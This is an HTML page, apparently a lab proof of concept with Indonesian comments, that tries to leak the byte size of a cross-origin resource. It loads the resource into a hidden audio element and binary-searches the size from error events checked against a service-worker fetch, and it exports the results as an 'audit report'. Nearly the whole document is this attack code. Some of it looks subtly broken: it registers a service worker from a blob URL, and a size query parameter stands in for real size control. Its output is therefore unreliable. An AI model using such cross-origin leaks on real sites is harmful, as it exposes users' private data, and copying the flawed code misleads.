<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Cross-Origin Size Leak Laboratory</title>
    <style>
        *{font-family:Mukta,sans-serif;color:#3b3b3b;box-sizing:border-box;}
        body{background:#0a0a0c;color:#00ffaa;padding:20px;}
        input{background:inherit}
        #result{max-width:720px;overflow-y:hidden;overflow-x:hidden}
        #result p{font-weight:300;padding:8px 12px;margin:5px;max-width:700px;border-radius:4px;}
        iframe, audio{width:1px;height:1px;border:0;opacity:0;position:absolute;}
        small{color:gray;font-weight:400;font-style:italic;font-size:16px;margin-top:-5px;display:block;margin-bottom:30px}
        small strong{font-weight:600;font-size:18px;color:#00ffaa}
        input{width:515px;font-size:18px;padding:10px 14px;border:1px solid #00ffaa;border-radius:6px;margin:3px;margin-left:0;background:#111;color:#fff;}
        button{font-size:18px;padding:10px 14px;border-radius:6px;border:1px solid #00ffaa;background:#05140f;color:#00ffaa;cursor:pointer;margin:3px;margin-left:0;margin-bottom:20px;font-weight:bold;}
        button:hover{background:#00ffaa;color:#000;box-shadow:0 0 10px #00ffaa;}
        h1{margin-top:20px;color:#00ffaa;text-transform:uppercase;letter-spacing:1px;}
        .panel{border:1px solid #00ffaa;padding:15px;margin-bottom:15px;background:#010604;border-radius:6px;}
        .success{background:#05140f;color:#00ffaa;border:1px solid #00ffaa;}
        .error{background:#1f0f0f;color:#ff3333;border:1px solid #ff3333;}
        .msg{font-weight:600;color:inherit;}
    </style>
</head>
<body>
    
    <h1>Cross-origin size leak</h1>
    <small>Compatible with <strong>Chrome Chromium Engine</strong> only</small>

    <div class="panel">
        <form id="form" method="POST">
          <input name="url" placeholder="https://www.google.com/robots.txt" value="https://www.google.com/robots.txt"/>
          <button type="submit">Run Search Chain</button>
          <button id="export-log-report" type="button" style="background: #142414; display: none;">Download Audit Report (.TXT)</button>
        </form>
    </div>

    <div id="result"></div>

    <script>
        const result = document.getElementById("result");
        const form = document.getElementById("form");
        let auditReports = []; 

        // STRATEGI INLINE SERVICE WORKER GENERATION
        const workerCode = `
            self.addEventListener('install', (e) => { e.waitUntil(self.skipWaiting()); });
            self.addEventListener('activate', (e) => { e.waitUntil(self.clients.claim()); });
            self.addEventListener('fetch', (e) => {
                if (e.request.url.includes('/mock.css')) {
                    e.respondWith(new Response('body { color: red; }', { headers: { 'Content-Type': 'text/css' } }));
                }
            });
        `;

        if ("serviceWorker" in navigator) {
            const blob = new Blob([workerCode], { type: "text/javascript" });
            const workerUrl = URL.createObjectURL(blob);

            navigator.serviceWorker.register(workerUrl).then(registration => {
                if (!navigator.serviceWorker.controller) {
                    setTimeout(() => { location.reload(); }, 300);
                }
            }).catch(err => {
                console.error("Worker Inisialisasi Gagal: ", err);
            });
        }

        const binarySearchSize = async (url, minSize, maxSize) => {
            let foundSize = -1;
            document.getElementById("export-log-report").style.display = "none";
            writeMsg(url, "success", `Menginisialisasi serialisasi komputasi pipa biner...`);
            
            while (minSize <= maxSize) {
                let mid = Math.floor((minSize + maxSize) / 2);
                
                // Menjamin penanganan sekuensial interupsi selesai sepenuhnya sebelum kalkulasi berikutnya
                let isAtLeastMid = await checkSizeThroughSideChannel(url, mid);
                
                if (isAtLeastMid) {
                    foundSize = mid + 1;
                    minSize = mid + 1;
                } else {
                    maxSize = mid - 1;
                }
                
                // Jeda mikro untuk memberikan kesempatan mesin peramban melakukan garbage collection memori DOM
                await new Promise(r => setTimeout(r, 25));
            }
            writeMsg(url, "success", `Rantai Pipa Selesai: Kapasitas dokumen terisolasi -> <b>${foundSize}</b> bytes.`);
            document.getElementById("export-log-report").style.display = "inline-block";
        };

        // REKAYASA PENGUATAN: Pipa Validasi Multi-Event & Memory Cleanup
        const checkSizeThroughSideChannel = (url, size) => {
            return new Promise((resolve) => {
                let sound = document.createElement("audio");
                
                // Fungsi penutup untuk menghentikan soket gantung dan membersihkan memori buffer
                const hancurkanObjekMeds = async (isTrueSize) => {
                    if (sound) {
                        sound.src = ""; 
                        sound.onerror = null;
                        sound.onstalled = null;
                        sound.onabort = null;
                        sound.remove();
                        sound = null;
                    }
                    resolve(isTrueSize);
                };

                // Pemicu evaluasi status ketika elemen mendeteksi malformasi batasan ukuran berkas
                const tanganiResponsError = async () => {
                    try {
                        // Verifikasi silang melalui kontrol jalur interupsi Service Worker
                        await fetch("/mock.css", { mode: "no-cors" });
                        writeMsg(url, "error", `Analisis Vektor: Tidak mengandung kapasitas ukuran <b>${size - 1}</b> bytes.`);
                        hancurkanObjekMeds(false);
                    } catch(err) {
                        hancurkanObjekMeds(true);
                    }
                };

                // Memperluas penangkapan event untuk menangani fluktuasi latensi jaringan internet
                sound.onerror = tanganiResponsError;
                sound.onstalled = tanganiResponsError;
                sound.onabort = tanganiResponsError;
                
                document.body.appendChild(sound);
                
                // Mengirimkan muatan dengan parameter manipulasi kapasitas ukuran dan pengabaian cache (cache buster)
                sound.src = `${url}?size=${size}&cb=${Math.random()}`;
            });
        };

        const writeMsg = (url, status, message) => {
            const timestamp = new Date().toLocaleTimeString();
            auditReports.push(`[${timestamp}] [${status.toUpperCase()}] Resource on ${url} ${message.replace(/<[^>]*>/g, '')}`);
            
            result.innerHTML += `<p class="${status}">Resource on <span class="msg">${url}</span> ${message}</p>`;
            result.scrollTop = result.scrollHeight;
        };

        form.onsubmit = async (e) => {
            e.preventDefault();
            let url = form.url.value.trim();
            let minSize = 1;
            let maxSize = 10000;
            auditReports = []; 
            binarySearchSize(url, minSize, maxSize);
        };

        // LAYANAN EKSPOR LAPORAN AUDIT LABORATORIUM
        document.getElementById("export-log-report").addEventListener("click", () => {
            if (auditReports.length === 0) return;
            
            const textBlob = new Blob([auditReports.join("\r\n")], { type: "text/plain" });
            const downloadAnchor = document.createElement("a");
            
            downloadAnchor.download = `size_leak_audit_${Math.round(Date.now()/1000)}.txt`;
            downloadAnchor.href = window.URL.createObjectURL(textBlob);
            downloadAnchor.style.display = "none";
            
            document.body.appendChild(downloadAnchor);
            downloadAnchor.click();
            downloadAnchor.remove();
        });
    </script>
</body>
</html>
